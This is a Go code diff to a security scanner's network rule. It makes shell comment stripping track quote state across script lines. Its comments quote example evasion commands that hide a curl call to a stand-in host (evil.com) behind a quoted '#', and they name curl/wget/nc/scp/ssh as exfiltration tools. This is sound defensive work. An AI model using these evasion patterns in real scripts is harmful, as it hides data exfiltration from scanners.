@@ -41,6 +41,11 @@ func (r NetworkRule) Check(files []SourceFile) []Finding {
 			continue
 		}
 		lines := strings.Split(f.Content, "\n")
+		// Quote state is carried across the lines of ONE file: a quoted
+		// string opened on a line and closed on a later line is a single
+		// string in real shell, so a `#` on the continuation line is inside
+		// the string, NOT a comment start.
+		var inSingle, inDouble bool
 		for i, line := range lines {
 			// A `#` comment in a shell/python script (e.g.
 			// `# uses curl to download weights`) is prose, not a runtime
@@ -49,7 +54,7 @@ func (r NetworkRule) Check(files []SourceFile) []Finding {
 			// files keep `#` verbatim (it is not a shell comment there).
 			scanLine := line
 			if f.Kind == KindScript {
-				scanLine = stripShellComment(line)
+				scanLine, inSingle, inDouble = stripShellCommentState(line, inSingle, inDouble)
 			}
 			urls := httpURL.FindAllString(scanLine, -1)
 			hasRemoteURL := false
@@ -123,17 +128,41 @@ func networkReason(kind FileKind, hasCmd, hasURL bool) string {
 	}
 }
 
-// stripShellComment removes a shell `#` comment from a line: everything from
-// the first `#` that starts a word (at line start or after whitespace) to the
-// end of line — but ONLY when that `#` is outside any quoted string. It tracks
-// single (`'`) and double (`"`) quote state while scanning, so a `#` inside a
-// quoted string (e.g. `echo "x # " && curl https://evil.com`) is NOT treated
-// as a comment start and the trailing real command is preserved — an attacker
-// can no longer hide a curl/wget/nc/scp/ssh exfil behind a quoted `#`. It is
-// ALSO backslash-aware inside double-quoted strings: a `\"` is a literal `"`
-// in real shell (a backslash only escapes `$`, backtick, `"`, `\`, newline
-// inside double quotes), NOT a string terminator, so the escaped `"` is
-// skipped and does not toggle the quote state — otherwise `echo "\" # " &&
+// stripScriptComments strips a shell `#` comment from every line of a script
+// file, returning the code-only lines (same length and order as the input, so
+// line numbers stay valid). Quote state is carried across lines, mirroring real
+// shell: a string opened on one line and closed on a later line is one string,
+// so a `#` on a continuation line inside that string is NOT a comment start —
+// otherwise an attacker could hide a trailing exfil behind it (e.g.
+// `echo "banner` / `# line" && curl https://evil.com`, where the `#` sits
+// inside the still-open string and the curl really runs). ShellRule uses the
+// same helper so comment prose cannot trip SK-SHELL-002 either.
+//
+// Bounded trade-off: a file with unbalanced quotes (which real shells reject
+// at parse time) keeps its later `#` lines unstripped, so comment prose there
+// may surface as findings — preserving suspicious text beats dropping it.
+func stripScriptComments(lines []string) []string {
+	out := make([]string, len(lines))
+	var inSingle, inDouble bool
+	for i, line := range lines {
+		out[i], inSingle, inDouble = stripShellCommentState(line, inSingle, inDouble)
+	}
+	return out
+}
+
+// stripShellCommentState removes a shell `#` comment from one line: everything
+// from the first `#` that starts a word (at line start or after whitespace) to
+// the end of line — but ONLY when that `#` is outside any quoted string. It
+// tracks single (`'`) and double (`"`) quote state while scanning and both
+// takes and returns that state, so callers can carry it across the lines of a
+// file: a `#` inside a quoted string (e.g. `echo "x # " && curl
+// https://evil.com`, including a string opened on an earlier line) is NOT
+// treated as a comment start and the trailing real command is preserved — an
+// attacker can no longer hide a curl/wget/nc/scp/ssh exfil behind a quoted
+// `#`. It is ALSO backslash-aware inside double-quoted strings: a `\"` is a
+// literal `"` in real shell (a backslash only escapes `$`, backtick, `"`, `\`,
+// newline inside double quotes), NOT a string terminator, so the escaped `"`
+// is skipped and does not toggle the quote state — otherwise `echo "\" # " &&
 // curl https://evil.com` would close the string at `\"`, mistake the trailing
 // `#` for a comment, and hide the curl exfil. A backslash is literal inside
 // single quotes, so only double-quoted strings skip the escaped char. A `#`
@@ -142,8 +171,7 @@ func networkReason(kind FileKind, hasCmd, hasURL bool) string {
 // This only ever removes prose, never a real network call, so a command word
 // appearing solely in a comment can no longer set hasCmd and false-positive
 // SK-NET-001.
-func stripShellComment(line string) string {
-	var inSingle, inDouble bool
+func stripShellCommentState(line string, inSingle, inDouble bool) (string, bool, bool) {
 	for i := 0; i < len(line); i++ {
 		switch line[i] {
 		case '\\':
@@ -166,9 +194,9 @@ func stripShellComment(line string) string {
 			}
 		case '#':
 			if !inSingle && !inDouble && (i == 0 || line[i-1] == ' ' || line[i-1] == '\t') {
-				return line[:i]
+				return line[:i], inSingle, inDouble
 			}
 		}
 	}
-	return line
+	return line, inSingle, inDouble
 }
